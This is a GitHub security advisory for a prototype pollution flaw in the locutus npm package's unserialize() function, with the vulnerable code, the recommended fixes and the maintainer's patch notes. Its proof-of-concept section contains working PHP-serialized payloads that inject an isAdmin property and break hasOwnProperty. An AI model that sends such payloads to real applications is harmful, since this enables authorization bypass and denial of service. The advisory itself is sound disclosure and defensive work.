# [M] Locutus has Prototype Pollution via __proto__ Key Injection in unserialize()

## Summary
Severity: Medium
Advisory: GHSA-4mph-v827-f877
CVE: CVE-2026-33993
CWE: CWE-1321
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-03-27
Source: https://github.com/advisories/GHSA-4mph-v827-f877
Type: github-advisory

## Affected
- npm: `locutus` — affected >=0 <3.0.25

## Details
## Summary

The `unserialize()` function in `locutus/php/var/unserialize` assigns deserialized keys to plain objects via bracket notation without filtering the `__proto__` key. When a PHP serialized payload contains `__proto__` as an array or object key, JavaScript's `__proto__` setter is invoked, replacing the deserialized object's prototype with attacker-controlled content. This enables property injection, for...in propagation of injected properties, and denial of service via built-in method override.

This is distinct from the previously reported prototype pollution in `parse_str` (GHSA-f98m-q3hr-p5wq, GHSA-rxrv-835q-v5mh) — `unserialize` is a different function with no mitigation applied.

## Details

The vulnerable code is in two functions within `src/php/var/unserialize.ts`:

**`expectArrayItems()` at line 358:**
```typescript
// src/php/var/unserialize.ts:329-366
function expectArrayItems(
  str: string,
  expectedItems = 0,
  cache: CacheFn,
): [UnserializedObject | UnserializedValue[], number] {
  // ...
  const items: UnserializedObject = {}
  // ...
  for (let i = 0; i < expectedItems; i++) {
    key = expectKeyOrIndex(str)
    // ...
    item = expectType(str, cache)
    // ...
    items[String(key[0])] = item[0]  // line 358 — no __proto__ filtering
  }
  // ...
}
```

**`expectObject()` at line 278:**
```typescript
// src/php/var/unserialize.ts:246-287
function expectObject(str: string, cache: CacheFn): ParsedResult {
  // ...
  const obj: UnserializedObject = {}
  // ...
  for (let i = 0; i < propCount; i++) {
    // ...
    obj[String(prop[0])] = value[0]  // line 278 — no __proto__ filtering
  }
  // ...
}
```

Both functions create a plain object (`{}`) and assign user-controlled keys via bracket notation. When the key is `__proto__`, JavaScript's `__proto__` setter replaces the object's prototype rather than creating a regular property. This means:

1. Properties in the attacker-supplied prototype become accessible via dot notation and the `in` operator
2. These properties are invisible to `Object.keys()`, `JSON.stringify()`, and `hasOwnProperty()`
3. They propagate to copies made via `for...in` loops, becoming real own properties
4. The attacker can override `hasOwnProperty`, `toString`, `valueOf` with non-function values

Notably, `parse_str` in the same package has a regex guard against `__proto__` (line 74 of `src/php/strings/parse_str.ts`), but no equivalent protection was applied to `unserialize`.

This is **not** global `Object.prototype` pollution — only the deserialized object's prototype is replaced. Other objects in the application are not affected.

## PoC

**Setup:**
```bash
npm install locutus@3.0.24
```

**Step 1 — Property injection via array deserialization:**
```js
import { unserialize } from 'locutus/php/var/unserialize';

const payload = 'a:2:{s:9:"__proto__";a:1:{s:7:"isAdmin";b:1;}s:4:"name";s:3:"bob";}';
const config = unserialize(payload);

console.log(config.isAdmin);           // true (injected via prototype)
console.log(Object.keys(config));      // ['name'] — isAdmin is hidden
console.log('isAdmin' in config);      // true — bypasses 'in' checks
console.log(config.hasOwnProperty('isAdmin')); // false — invisible to hasOwnProperty
```

**Verified output:**
```
true
[ 'name' ]
true
false
```

**Step 2 — for...in propagation makes injected properties real:**
```js
const copy = {};
for (const k in config) copy[k] = config[k];
console.log(copy.isAdmin);                     // true (now an own property)
console.log(copy.hasOwnProperty('isAdmin'));    // true
```

**Verified output:**
```
true
true
```

**Step 3 — Method override denial of service:**
```js
const payload2 = 'a:1:{s:9:"__proto__";a:1:{s:14:"hasOwnProperty";b:1;}}';
const obj = unserialize(payload2);
obj.hasOwnProperty('x');  // TypeError: obj.hasOwnProperty is not a function
```

**Verified output:**
```
TypeError: obj.hasOwnProperty is not a function
```

**Step 4 — Object type (stdClass) is also vulnerable:**
```js
const payload3 = 'O:8:"stdClass":2:{s:9:"__proto__";a:1:{s:7:"isAdmin";b:1;}s:4:"name";s:3:"bob";}';
const obj2 = unserialize(payload3);
console.log(obj2.isAdmin);       // true
console.log('isAdmin' in obj2);  // true
```

**Step 5 — Confirm NOT global pollution:**
```js
console.log(({}).isAdmin);  // undefined — global Object.prototype is clean
```

## Impact

- **Property injection**: Attacker-controlled properties become accessible on the deserialized object via dot notation and the `in` operator while being invisible to `Object.keys()` and `hasOwnProperty()`. Applications that use `if (config.isAdmin)` or `if ('role' in config)` patterns on deserialized data are vulnerable to authorization bypass.
- **Property propagation**: When consuming code copies the object using `for...in` (a common JavaScript pattern for object spreading or cloning), injected prototype properties materialize as real own properties, surviving all subsequent `hasOwnProperty` checks.
- **Denial of service**: The injected prototype can override `hasOwnProperty`, `toString`, `valueOf`, and other `Object.prototype` methods with non-function values, causing `TypeError` when these methods are called on the deserialized object.

The primary use case for locutus `unserialize` is deserializing PHP-serialized data in JavaScript applications, often from external or untrusted sources. This makes the attack surface realistic.

## Recommended Fix

Filter dangerous keys before assignment in both `expectArrayItems` and `expectObject`. Use `Object.defineProperty` to create a data property without triggering the `__proto__` setter:

```typescript
const DANGEROUS_KEYS = new Set(['__proto__', 'constructor', 'prototype']);

// In expectArrayItems (line 358) and expectObject (line 278):
const keyStr = String(key[0]); // or String(prop[0]) in expectObject
if (DANGEROUS_KEYS.has(keyStr)) {
  Object.defineProperty(items, keyStr, {
    value: item[0],
    writable: true,
    enumerable: true,
    configurable: true,
  });
} else {
  items[keyStr] = item[0];
}
```

Alternatively, create objects with a null prototype to prevent `__proto__` setter invocation entirely:

```typescript
// Replace: const items: UnserializedObject = {}
// With:
const items = Object.create(null) as UnserializedObject;
```

The `Object.create(null)` approach is more robust as it prevents the `__proto__` setter from ever being triggered, regardless of key value.


## Maintainer Reponse

Thank you for the report. This issue was reproduced locally against `locutus@3.0.24`, confirming that `unserialize()` was vulnerable to `__proto__`-driven prototype injection on the returned object.

This is now fixed on `main` and released in `locutus@3.0.25`.

## Fix Shipped In

- **PR:** [#597](https://github.com/locutusjs/locutus/pull/597)
- **Merge commit on `main`:** `345a6211e1e6f939f96a7090bfeff642c9fcf9e4`
- **Release:** [v3.0.25](https://github.com/locutusjs/locutus/releases/tag/v3.0.25)

## What the Fix Does

The fix hardens `src/php/var/unserialize.ts` by treating `__proto__`, `constructor`, and `prototype` as dangerous keys and defining them as plain own properties instead of assigning through normal bracket notation. This preserves the key in the returned value without invoking JavaScript's prototype setter semantics.

## Tested Repro Before the Fix

- Attacker-controlled serialized `__proto__` key produced inherited properties on the returned object
- `Object.keys()` hid the injected key while `'key' in obj` stayed true
- Built-in methods like `hasOwnProperty` could be disrupted

## Tested State After the Fix in `3.0.25`

- Dangerous keys are kept as own enumerable properties
- The returned object's prototype is not replaced
- The regression is covered by `test/custom/unserialize-prototype-pollution.vitest.ts`

---

The locutus team is treating this as a real package vulnerability with patched version `3.0.25`.

## References
- https://github.com/locutusjs/locutus/security/advisories/GHSA-4mph-v827-f877
- https://nvd.nist.gov/vuln/detail/CVE-2026-33993
- https://github.com/locutusjs/locutus/pull/597
- https://github.com/locutusjs/locutus/commit/345a6211e1e6f939f96a7090bfeff642c9fcf9e4
- https://github.com/locutusjs/locutus
- https://github.com/locutusjs/locutus/releases/tag/v3.0.25
